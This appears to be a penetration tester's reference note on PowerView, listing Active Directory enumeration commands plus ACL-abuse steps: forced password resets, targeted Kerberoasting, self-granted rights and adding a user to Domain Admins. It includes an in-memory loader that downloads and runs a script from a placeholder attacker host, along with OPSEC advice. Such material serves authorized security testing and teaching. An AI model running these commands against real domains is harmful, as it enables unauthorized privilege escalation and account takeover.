# PowerView

**Tags:** `#powerview` `#activedirectory` `#enumeration` `#acl` `#kerberos` `#ad-recon` `#powershell`

PowerShell AD recon tool from PowerSploit. Wraps LDAP queries into usable functions for situational awareness, ACL path finding, and pre-attack enumeration. Orders of magnitude more useful than `net *` commands — covers users, groups, computers, shares, ACLs, GPOs, and trusts in one script.

**Source:** https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
**SharpView (.NET port):** https://github.com/dmchell/SharpView
**Install:** download `PowerView.ps1` — already in `/opt/` on most Kali builds, or grab from PowerSploit repo

```powershell
# Import (from disk)
Import-Module .\PowerView.ps1

# Bypass execution policy
powershell -ep bypass
. .\PowerView.ps1

# Load from memory
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

# Run as another user
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)
Get-DomainUser -Credential $cred
```

> [!note] **PowerView vs BloodHound** — BloodHound covers most of this automatically and shows attack paths visually. Use PowerView for targeted queries, verifying specific access, and ACL manipulation (BloodHound is read-only). Both complement each other on an engagement.

---

## Domain Enumeration

```powershell
# Domain basics
Get-Domain
Get-DomainController
Get-DomainController | Select-Object Name, IPAddress, OSVersion

# Password policy and Kerberos ticket lifetimes
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"

# Forest info
Get-Forest
Get-ForestDomain
```

---

## User Enumeration

```powershell
# All users — useful columns
Get-DomainUser | Select-Object samaccountname, description, memberof, pwdlastset, lastlogon

# Specific user
Get-DomainUser -Identity jsmith

# Passwords in description field (common misconfiguration)
Get-DomainUser | Where-Object {$_.description -like "*pass*" -or $_.description -like "*pwd*"} |
    Select-Object samaccountname, description

# Admin users (AdminSDHolder-protected)
Get-DomainUser -AdminCount | Select-Object samaccountname, admincount

# Kerberoastable users (SPN set on account)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# ASREPRoastable users (no Kerberos pre-auth required)
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname

# Stale accounts — no password change in 90+ days
$cutoff = (Get-Date).AddDays(-90)
Get-DomainUser | Where-Object {$_.pwdlastset -lt $cutoff} | Select-Object samaccountname, pwdlastset

# Dump all properties (export to CSV for offline review)
Get-DomainUser -Properties * | Export-Csv -Path C:\Temp\users.csv -NoTypeInformation
```

---

## Group Enumeration

```powershell
# All groups
Get-DomainGroup | Select-Object samaccountname, description

# Members of a group (recursive to catch nested memberships)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# Groups a specific user belongs to
Get-DomainGroup -MemberIdentity jsmith

# AdminSDHolder-protected groups
Get-DomainGroup -AdminCount | Select-Object samaccountname

# Local groups on a remote machine
Get-NetLocalGroup -ComputerName DC01
Get-NetLocalGroupMember -ComputerName DC01 -GroupName Administrators
```

---

## Computer Enumeration

```powershell
# All computers
Get-DomainComputer | Select-Object dnshostname, operatingsystem, lastlogontimestamp

# Domain Controllers
Get-DomainController | Select-Object Name, IPAddress

# Unconstrained delegation — prime targets for coercion attacks (Printerbug, PetitPotam)
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# Constrained delegation — what services can these accounts impersonate?
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# Stale computers
$cutoff = (Get-Date).AddDays(-90)
Get-DomainComputer | Where-Object {$_.lastlogontimestamp -lt $cutoff} | Select-Object dnshostname, lastlogontimestamp
```

---

## Share Enumeration

```powershell
# All shares across the domain (slow — hits every computer)
Find-DomainShare

# Only shares the current user can access
Find-DomainShare -CheckShareAccess

# Interesting files on accessible shares
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.config,*.xml,*.ini,*.txt,*password*,*cred*

# Shares on a specific host
Get-NetShare -ComputerName FS01
```

---

## Session & Logon Enumeration

```powershell
# Active sessions on a host (requires admin or pre-2019 OS)
Get-NetSession -ComputerName DC01

# Logged-on users on a host
Get-NetLoggedon -ComputerName FS01

# Find where a specific user is currently logged in
Find-DomainUserLocation -UserIdentity jsmith

# Find where Domain Admins are currently logged in
Find-DomainUserLocation -GroupName "Domain Admins" | Select-Object UserName, SessionFromName
```

---

## ACL Enumeration

ACLs are where privilege escalation paths live. Look for non-standard rights on regular user accounts.

```powershell
# ACLs on a specific object (resolve GUIDs to readable names — always use this flag)
Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs

# What rights does a specific user have?
Get-DomainObjectACL -Identity jsmith -ResolveGUIDs

# Sweep the domain for interesting ACLs (slow on large domains — noisy)
Find-InterestingDomainAcl -ResolveGUIDs

# Filter sweep results to a specific user
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "jsmith"}

# DCSync rights on the domain object — look for DS-Replication-Get-Changes-All
Get-DomainObjectACL -Identity "DC=inlanefreight,DC=local" -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"}
```

**Key ACE rights to look for:**

| Right | Impact |
|---|---|
| `GenericAll` | Full control — reset password, add to group, write any attribute |
| `GenericWrite` | Write attributes — set SPN (targeted Kerberoasting), set logon script |
| `WriteOwner` | Take ownership → grant yourself GenericAll |
| `WriteDACL` | Modify the ACL → grant yourself any right |
| `ForceChangePassword` | Reset password without knowing current |
| `AllExtendedRights` | Includes ForceChangePassword and DCSync |
| `DS-Replication-Get-Changes-All` | DCSync — dump NTDS.dit remotely via secretsdump |

---

## GPO & OU Enumeration

```powershell
# All GPOs
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# GPOs applied to a specific computer
Get-DomainGPO -ComputerIdentity DC01

# GPO → local group mappings (restricted group abuse)
Get-DomainGPOLocalGroup

# Which GPO adds users to local Administrators?
Get-DomainGPOComputerLocalGroupMapping -LocalGroup Administrators

# OUs
Get-DomainOU | Select-Object name, distinguishedname
```

---

## Trust Enumeration

```powershell
# Domain trusts
Get-DomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection

# Forest trusts
Get-ForestTrust

# Map all trusts across the entire forest
Get-ForestDomain | ForEach-Object { Get-DomainTrust -Domain $_.Name }
```

| Trust Type | Direction | Notes |
|---|---|---|
| `ParentChild` | Bidirectional | Always bidirectional, implicit within a forest |
| `External` | One-way or bidirectional | To a domain in a separate forest |
| `Forest` | One-way or bidirectional | Full forest trust |

---

## Kerberos Attack Prep

```powershell
# Kerberoastable — pipe to Invoke-Kerberoast or Rubeus
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof

# ASREPRoastable
Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname

# Unconstrained delegation computers — coerce auth here to capture TGTs
Get-DomainComputer -Unconstrained | Select-Object dnshostname, operatingsystem

# Constrained delegation — what services can these delegate to?
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# RBCD — who can write msDS-AllowedToActOnBehalfOfOtherIdentity on computers?
Get-DomainComputer | Get-DomainObjectACL -ResolveGUIDs |
    Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and
                  $_.ObjectAceType -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}
```

---

## ACL Abuse

```powershell
# ForceChangePassword — reset without knowing current password
$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass

# GenericWrite on user — set SPN for targeted Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/FAKE'}
# then: Invoke-Kerberoast -Identity targetuser | Select-Object -ExpandProperty Hash

# WriteDACL — grant yourself GenericAll
Add-DomainObjectACL -TargetIdentity "Domain Admins" -PrincipalIdentity jsmith -Rights All

# WriteOwner — take ownership first, then grant rights
Set-DomainObjectOwner -Identity targetobject -OwnerIdentity jsmith
Add-DomainObjectACL -TargetIdentity targetobject -PrincipalIdentity jsmith -Rights All

# Add user to a group (requires GenericAll/GenericWrite on the group object)
Add-DomainGroupMember -Identity "Domain Admins" -Members jsmith
```

---

## Useful One-Liners

```powershell
# Check if current user already has DCSync rights
Get-DomainObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs |
    Where-Object {($_.IdentityReferenceName -eq $env:USERNAME) -and ($_.ActiveDirectoryRights -match "Replication")}

# Find DA members with last logon (for targeting stale DA accounts)
Get-DomainGroupMember "Domain Admins" -Recurse | Get-DomainUser | Select-Object samaccountname, lastlogon

# All users with descriptions (check manually for hardcoded passwords)
Get-DomainUser | Select-Object samaccountname, description | Where-Object {$_.description}

# Export everything to CSV for offline analysis
Get-DomainUser -Properties * | Export-Csv users.csv -NoTypeInformation
Get-DomainComputer -Properties * | Export-Csv computers.csv -NoTypeInformation
Get-DomainGroup -Properties * | Export-Csv groups.csv -NoTypeInformation
```

> [!warning] **OPSEC** — `Find-DomainShare`, `Find-DomainUserLocation`, and `Find-InterestingDomainAcl` hit every host or object in the domain. They generate significant network traffic and LDAP queries. Use targeted queries where possible, or run them during off-hours windows.

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
